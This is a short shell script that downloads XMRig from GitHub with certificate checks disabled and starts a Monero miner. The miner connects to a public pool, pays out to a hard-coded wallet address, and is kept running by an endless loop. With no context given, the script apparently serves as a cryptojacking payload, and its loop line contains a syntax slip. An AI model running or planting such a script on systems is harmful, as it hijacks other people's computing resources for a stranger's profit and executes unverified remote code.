#!/bin/sh
wget --no-check-certificate https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz
tar xf xmrig-6.16.4-linux-x64.tar.gz
cd xmrig-6.16.4 && ./xmrig -o us-west.minexmr.com:443 -u 43hRiUpf5G1i7L2cYvMNf2gxukx5bS98wMTsVJDckMDo1PRLtdwbxteAW3wdduBVYkBwRw7rXGDfWD34uF9th7ALNymJCbp -k --tls --rig-id ZZelMiners
while[ 1 ]; do
sleep 3
done
sleep 999
